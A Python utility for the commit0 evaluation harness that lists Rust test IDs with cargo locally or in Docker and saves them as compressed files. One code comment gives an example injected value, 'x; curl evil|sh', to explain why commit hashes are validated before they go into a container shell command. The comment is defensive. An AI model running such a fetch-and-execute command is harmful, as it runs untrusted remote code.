"""Generate Rust test ID files (.bz2) for commit0 repos.

Runs `cargo test -p <crate> -- --list` against each Rust repo to discover all
test function names, then saves them as bz2-compressed files compatible with
commit0's Rust evaluation harness.

Test IDs use the format: module::path::test_name (e.g., "tests::test_empty_string").

Usage:
    # From dataset entries JSON:
    python -m tools.generate_test_ids_rust rust_dataset.json --output-dir ./test_ids

    # From a local repo directory:
    python -m tools.generate_test_ids_rust --repo-dir /path/to/repo --test-cmd "cargo test -p grex" --output-dir ./test_ids

    # Using Docker (requires built images):
    python -m tools.generate_test_ids_rust rust_dataset.json --docker --output-dir ./test_ids

    # Install into commit0 data directory:
    python -m tools.generate_test_ids_rust rust_dataset.json --install

Requires:
    - Rust toolchain installed (for local collection)
    - Docker (for --docker mode)
"""

from __future__ import annotations

import argparse
import json
import logging
import re
import subprocess
import sys
from pathlib import Path

# A reference commit interpolated into a container shell command must be a bare
# git SHA — reject anything with shell metacharacters (e.g. `x; curl evil|sh`).
_COMMITISH_RE = re.compile(r"^[0-9a-fA-F]{4,40}$")

import docker
import docker.errors
import requests.exceptions

from commit0.harness.docker_utils import get_docker_platform
from tools.generate_test_ids import (
    _find_docker_image,
    _find_repo_dir,
    install_test_ids,
    save_test_ids,
)

logging.basicConfig(level=logging.INFO, format="%(levelname)s: %(message)s")
logger = logging.getLogger(__name__)

_CONTAINER_WORKDIR = "/testbed"


# ---------------------------------------------------------------------------
# Parsers
# ---------------------------------------------------------------------------


def _parse_cargo_test_list(stdout: str) -> list[str]:
    """Parse `cargo test -- --list` output into test IDs.

    Each line of the listing has the format:
        module::path::test_name: test
        module::path::bench_name: bench

    Only lines ending with `: test` are included (benchmarks are skipped).

    Returns test IDs without the `: test` suffix.
    """
    test_ids: list[str] = []
    for line in stdout.splitlines():
        line = line.strip()
        if line.endswith(": test"):
            test_ids.append(line[: -len(": test")])

    return test_ids


def _parse_test_cmd_args(test_cmd: str) -> list[str]:
    """Extract cargo args from a test_cmd string.

    Parses flags like `-p <crate>`, `--package <crate>`, `--all-features`,
    `--features <list>`, and `--no-default-features` from the test command.

    Returns the extracted args (not including `cargo test` itself or `-- --list`).
    """
    parts = test_cmd.split()
    args: list[str] = []
    i = 0
    while i < len(parts):
        if parts[i] in ("cargo", "test"):
            i += 1
            continue
        if parts[i] in ("-p", "--package", "--features") and i + 1 < len(parts):
            args.extend([parts[i], parts[i + 1]])
            i += 2
        elif parts[i] in ("--all-features", "--no-default-features"):
            args.append(parts[i])
            i += 1
        elif parts[i] == "--":
            # Stop at -- separator
            break
        else:
            i += 1
    return args


def _build_cargo_list_cmd(test_cmd: str) -> list[str]:
    """Build the full command for `cargo test ... -- --list`.

    Extracts relevant flags from test_cmd and appends `-- --list`.
    """
    args = _parse_test_cmd_args(test_cmd)
    return ["cargo", "test", *args, "--", "--list"]


# ---------------------------------------------------------------------------
# Local collection
# ---------------------------------------------------------------------------


def collect_test_ids_local(
    repo_dir: Path,
    test_cmd: str = "cargo test",
    timeout: int = 300,
) -> list[str]:
    """Run `cargo test -- --list` locally to discover Rust test names.

    Args:
    ----
        repo_dir: Path to the cloned Rust repo.
        test_cmd: The cargo test command (e.g., "cargo test -p grex").
        timeout: Subprocess timeout in seconds.

    Returns:
    -------
        List of test IDs (e.g., ["tests::test_foo", "module::test_bar"]).

    """
    cmd = _build_cargo_list_cmd(test_cmd)
    logger.info("Collecting test IDs: %s (in %s)", " ".join(cmd), repo_dir)

    try:
        result = subprocess.run(
            cmd,
            cwd=repo_dir,
            capture_output=True,
            text=True,
            timeout=timeout,
        )
    except subprocess.TimeoutExpired:
        logger.warning("  cargo test --list timed out after %ds", timeout)
        return []

    test_ids = _parse_cargo_test_list(result.stdout)
    logger.info("  Collected %d test IDs", len(test_ids))
    return test_ids


# ---------------------------------------------------------------------------
# Docker collection
# ---------------------------------------------------------------------------


def collect_test_ids_docker(
    repo_name: str,
    test_cmd: str = "cargo test",
    image_name: str | None = None,
    reference_commit: str | None = None,
    timeout: int = 300,
) -> list[str]:
    """Run `cargo test -- --list` inside a Docker container.

    If reference_commit is provided, resets to that commit first so that
    test collection runs against the real (un-stubbed) implementation.

    Args:
    ----
        repo_name: Repository name for Docker image lookup.
        test_cmd: The cargo test command (e.g., "cargo test -p grex").
        image_name: Docker image tag. Auto-detected if None.
        reference_commit: Git commit to reset to before collection.
        timeout: Container timeout in seconds.

    Returns:
    -------
        List of test IDs. Empty list on failure.

    """
    if image_name is None:
        image_name = _find_docker_image(repo_name)
        if image_name is None:
            image_name = f"commit0.repo.{repo_name.lower().replace('/', '_')}:v0"

    cargo_args = _parse_test_cmd_args(test_cmd)
    cargo_cmd = "cargo test " + " ".join(cargo_args) + " -- --list"

    # reference_commit was fetched during image build; remote is removed in container
    if reference_commit:
        if not _COMMITISH_RE.match(reference_commit.strip()):
            raise ValueError(
                f"Refusing to run: reference_commit is not a bare git SHA: {reference_commit!r}"
            )
        checkout = f"git reset --hard {reference_commit.strip()} && "
    else:
        checkout = ""

    bash_cmd = f"cd {_CONTAINER_WORKDIR} && {checkout}{cargo_cmd} 2>&1; true"

    client = docker.from_env()

    try:
        raw = client.containers.run(
            image_name,
            # argv form (no outer `bash -c '...'` single-quote wrapping) so the
            # command can't be broken out of via quoting.
            command=["bash", "-c", bash_cmd],
            remove=True,
            platform=get_docker_platform(),
        )
        stdout = (
            raw.decode("utf-8", errors="replace") if isinstance(raw, bytes) else raw
        )
    except docker.errors.ContainerError as e:
        raw_err = e.stderr
        stdout = (
            raw_err.decode("utf-8", errors="replace")
            if isinstance(raw_err, bytes)
            else (raw_err or "")
        )
    except docker.errors.ImageNotFound:
        logger.warning("  Docker image not found: %s", image_name)
        return []
    except requests.exceptions.ReadTimeout:
        logger.warning("  Docker cargo test --list timed out after %ds", timeout)
        return []

    test_ids = _parse_cargo_test_list(stdout)

    if not test_ids:
        logger.warning(
            "  No test IDs found in Docker output (image=%s, cmd=%s)",
            image_name,
            cargo_cmd,
        )
        if stdout:
            logger.debug("  Last 500 chars of output: %s", stdout[-500:])

    return test_ids


# ---------------------------------------------------------------------------
# Dataset orchestrator
# ---------------------------------------------------------------------------


def generate_for_dataset(
    dataset_path: Path,
    output_dir: Path,
    use_docker: bool = False,
    clone_dir: Path | None = None,
    timeout: int = 300,
    max_repos: int | None = None,
) -> dict[str, int]:
    """Generate test IDs for all repos in a dataset entries JSON file.

    Args:
    ----
        dataset_path: Path to the Rust dataset JSON.
        output_dir: Output directory for .bz2 files.
        use_docker: Run inside Docker containers.
        clone_dir: Directory containing cloned repos.
        timeout: Per-repo timeout in seconds.
        max_repos: Limit number of repos processed.

    Returns:
    -------
        Mapping of repo/crate names to test ID counts.

    """
    data = json.loads(dataset_path.read_text(encoding="utf-8"))

    if isinstance(data, dict) and "data" in data:
        entries = data["data"]
    elif isinstance(data, list):
        entries = data
    else:
        raise ValueError(f"Unknown dataset format in {dataset_path}")

    results: dict[str, int] = {}

    for i, entry in enumerate(entries):
        if max_repos and i >= max_repos:
            break

        repo = entry.get("repo", "")
        repo_name = repo.split("/")[-1] if "/" in repo else repo
        instance_id = entry.get("instance_id", repo_name)
        test_cmd = entry.get("test", {}).get("test_cmd", "cargo test")

        logger.info(
            "\n[%d/%d] Collecting Rust test IDs for %s...",
            i + 1,
            min(len(entries), max_repos or len(entries)),
            instance_id,
        )

        if use_docker:
            test_ids = collect_test_ids_docker(
                repo_name=repo_name,
                test_cmd=test_cmd,
                image_name=_find_docker_image(repo_name),
                reference_commit=entry.get("reference_commit"),
                timeout=timeout,
            )
        else:
            repo_dir = _find_repo_dir(clone_dir, repo, entry.get("original_repo", ""))

            if not repo_dir or not repo_dir.is_dir():
                logger.warning("  Repo dir not found — skipping")
                results[repo_name] = 0
                continue

            # Checkout reference commit to collect real test names (not stubbed).
            # Capture the current ref first so we can restore it — otherwise the
            # shared clone is left on a detached HEAD, corrupting any later step
            # that reuses it.
            reference_commit = entry.get("reference_commit")
            _orig_ref = None
            if reference_commit:
                try:
                    _orig_ref = subprocess.run(
                        ["git", "rev-parse", "--abbrev-ref", "HEAD"],
                        cwd=repo_dir, capture_output=True, text=True, timeout=30,
                    ).stdout.strip()
                    if not _orig_ref or _orig_ref == "HEAD":
                        _orig_ref = subprocess.run(
                            ["git", "rev-parse", "HEAD"],
                            cwd=repo_dir, capture_output=True, text=True, timeout=30,
                        ).stdout.strip()
                except Exception as e:  # noqa: BLE001
                    logger.debug("  Could not capture original ref: %s", e)
                try:
                    subprocess.run(
                        ["git", "checkout", reference_commit],
                        cwd=repo_dir,
                        capture_output=True,
                        text=True,
                        timeout=30,
                        check=True,
                    )
                except Exception as e:
                    logger.warning("  Could not checkout reference_commit: %s", e)

            try:
                test_ids = collect_test_ids_local(
                    repo_dir=repo_dir,
                    test_cmd=test_cmd,
                    timeout=timeout,
                )
            finally:
                # Restore the original ref so the shared clone isn't left on a
                # detached HEAD for any later step that reuses it.
                if _orig_ref:
                    try:
                        subprocess.run(
                            ["git", "checkout", _orig_ref],
                            cwd=repo_dir, capture_output=True, text=True, timeout=30,
                        )
                    except Exception as e:  # noqa: BLE001
                        logger.debug("  Could not restore original ref: %s", e)

        if test_ids:
            out_file = save_test_ids(test_ids, repo_name, output_dir)
            logger.info("  Saved %d test IDs to %s", len(test_ids), out_file)
            results[repo_name] = len(test_ids)
        else:
            logger.warning("  No test IDs collected for %s", instance_id)
            results[repo_name] = 0

    return results


# ---------------------------------------------------------------------------
# CLI entry point
# ---------------------------------------------------------------------------


def main() -> None:
    """CLI entry point for Rust test ID generation."""
    parser = argparse.ArgumentParser(
        description="Generate Rust test ID files (.bz2) for commit0 repos"
    )
    parser.add_argument(
        "input_file",
        nargs="?",
        help="Input dataset JSON (e.g., grex_rust_dataset.json)",
    )
    parser.add_argument(
        "--repo-dir",
        type=Path,
        help="Single local repo directory to collect from",
    )
    parser.add_argument(
        "--name",
        type=str,
        help="Repo/crate name (used with --repo-dir for output filename)",
    )
    parser.add_argument(
        "--test-cmd",
        type=str,
        default="cargo test",
        help="Cargo test command (default: 'cargo test')",
    )
    parser.add_argument(
        "--output-dir",
        type=Path,
        default=Path("./test_ids"),
        help="Output directory for .bz2 files (default: ./test_ids)",
    )
    parser.add_argument(
        "--clone-dir",
        type=Path,
        default=None,
        help="Directory where repos are cloned (default: ./repos_staging)",
    )
    parser.add_argument(
        "--docker",
        action="store_true",
        help="Use Docker containers for test collection",
    )
    parser.add_argument(
        "--install",
        action="store_true",
        help="Install .bz2 files into commit0 data directory",
    )
    parser.add_argument(
        "--timeout",
        type=int,
        default=300,
        help="Timeout per repo in seconds (default: 300)",
    )
    parser.add_argument(
        "--max-repos",
        type=int,
        default=None,
        help="Maximum number of repos to process",
    )

    args = parser.parse_args()

    if args.repo_dir:
        if not args.name:
            args.name = args.repo_dir.name
        test_ids = collect_test_ids_local(
            args.repo_dir,
            test_cmd=args.test_cmd,
            timeout=args.timeout,
        )
        if test_ids:
            out_file = save_test_ids(test_ids, args.name, args.output_dir)
            logger.info("Saved %d test IDs to %s", len(test_ids), out_file)
        else:
            logger.error("No test IDs collected")
            sys.exit(1)

    elif args.input_file:
        results = generate_for_dataset(
            Path(args.input_file),
            args.output_dir,
            use_docker=args.docker,
            clone_dir=args.clone_dir,
            timeout=args.timeout,
            max_repos=args.max_repos,
        )

        total = sum(v for v in results.values() if v > 0)
        logger.info(
            "\nDone: %d repos processed, %d total test IDs", len(results), total
        )

        if args.install:
            installed = install_test_ids(args.output_dir)
            logger.info("Installed %d files into commit0 data directory", installed)
    else:
        parser.error("Provide either input_file or --repo-dir")


if __name__ == "__main__":
    main()
